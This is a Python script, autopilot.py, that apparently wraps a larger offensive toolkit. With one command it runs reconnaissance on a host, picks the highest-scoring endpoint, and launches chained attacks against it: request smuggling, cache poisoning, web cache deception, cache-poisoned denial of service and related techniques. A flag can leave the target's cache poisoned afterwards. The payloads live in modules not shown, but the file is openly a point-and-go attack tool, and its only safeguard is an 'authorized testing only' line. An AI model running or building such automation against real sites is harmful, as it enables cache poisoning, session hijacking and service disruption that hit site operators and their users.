#!/usr/bin/env python3
"""
autopilot.py — one-command recon -> rank -> chained exploitation.

Ties full_recon.py and full_attack.py together so a single invocation:
  1. discovers endpoints, maps cache behavior, and classifies the proxy<->origin
     framing relationship (full_recon),
  2. picks the highest-scoring target (and a suitable content-substitution source),
  3. runs every attack technique AND the multi-stage chains against it (full_attack),
  4. prints a consolidated result with replayable requests.

It's the "just point it at a host and go" front end. For finer control, run
full_recon.py / full_attack.py individually (autopilot only orchestrates them).

Authorized testing only (CTF / lab / your own systems).

Examples:
  python autopilot.py --host T --port 5002 --cookie "session=<your-token-here>"
  python autopilot.py --host T --port 80                          # asks if a cookie is needed
  python autopilot.py --host T --port 80 --aggressive            # full sweep + chains
  python autopilot.py --host T --port 80 --target /login         # skip auto-selection
  python autopilot.py --host T --port 80 --deep-recon --json recon.json
"""

import argparse
import sys

from full_recon import Target, Recon, C, phase, resolve_cookie
from full_attack import Attacker, DEFAULTS


def main():
    ap = argparse.ArgumentParser(
        description="One-command recon -> rank -> chained exploitation "
                    "(authorized use only).")
    ap.add_argument("--host", default=DEFAULTS["host"])
    ap.add_argument("--port", type=int, default=DEFAULTS["port"])
    ap.add_argument("--cookie", default=DEFAULTS["cookie"],
                    help="Cookie header value (auth/session token). If omitted, "
                         "you'll be asked whether the target needs one. Use "
                         '--cookie "" to force no cookie.')
    ap.add_argument("--drop-path", default=DEFAULTS["drop_path"],
                    help="cache-flush endpoint ('' if none)")
    ap.add_argument("--path", action="append", default=[],
                    help="extra path to include in discovery (repeatable)")
    ap.add_argument("--target", help="skip auto-selection and attack this path")
    ap.add_argument("--source", help="override the content-substitution source page")
    ap.add_argument("--deep-recon", action="store_true",
                    help="also run recon's deception+CPDoS probes before scoring "
                         "(slower, better target ranking)")
    ap.add_argument("--retries", type=int, default=6,
                    help="attempts per race-sensitive carrier")
    ap.add_argument("--aggressive", action="store_true",
                    help="full obfuscation/delimiter sweep + don't stop at first hit")
    ap.add_argument("--keep", action="store_true",
                    help="do NOT restore the cache after attacks (leave it poisoned)")
    ap.add_argument("--json", metavar="PATH",
                    help="also write the recon results to this file")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    if args.no_color or not sys.stdout.isatty():
        C.on = False

    args.cookie = resolve_cookie(args.cookie)
    t = Target(args.host, args.port, args.cookie, args.drop_path)

    print(C.hdr(f"\nautopilot -> {args.host}:{args.port}"))
    print(C.dim(f"cookie: {args.cookie or '(none)'}   drop: {args.drop_path or '(none)'}"
                f"   {'AGGRESSIVE' if args.aggressive else 'standard'}"))

    # ---- Stage 1: recon ---------------------------------------------------- #
    phase("AUTOPILOT 1/2 - RECON & TARGET SELECTION")
    recon = Recon(t, args.path)
    live = recon.discover_endpoints()
    recon.analyze_cache(live)
    recon.classify_relationship(live)
    if args.deep_recon:
        recon.probe_deception(live)
        recon.probe_cpdos(live)
    recon.rank()
    if args.json:
        recon.export_json(args.json)

    # ---- choose target + source ------------------------------------------- #
    scored = recon._score()
    if args.target:
        target = args.target
        why = "user-specified"
    elif scored:
        target = scored[0][1]
        why = f"top-ranked (score {scored[0][0]})"
    else:
        target = args.path[0] if args.path else "/"
        why = "fallback (nothing scored)"
    source = args.source or recon._suggest_source(target) or "/"

    print("\n  " + C.hdr("Handoff to exploitation:"))
    print(f"    target = {C.ok(target)}  ({why})")
    print(f"    source = {source}  (content-substitution reference)")
    if recon.relationship:
        print(C.dim("    framing relationship:"))
        for c in recon.relationship:
            print(C.dim(f"      - {c}"))

    # ---- Stage 2: chained exploitation ------------------------------------ #
    phase("AUTOPILOT 2/2 - CHAINED EXPLOITATION")
    atk = Attacker(t, target, source, args.cookie, args.retries,
                   args.aggressive, args.keep, args.verbose)
    atk.baseline()
    atk.smuggle_and_poison()
    atk.desync_timing()
    atk.poison_unkeyed()
    atk.deception()
    atk.cpdos()
    atk.hmc()
    atk.chain()          # compose everything discovered above into end-to-end exploits
    atk.report()
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\ninterrupted.")
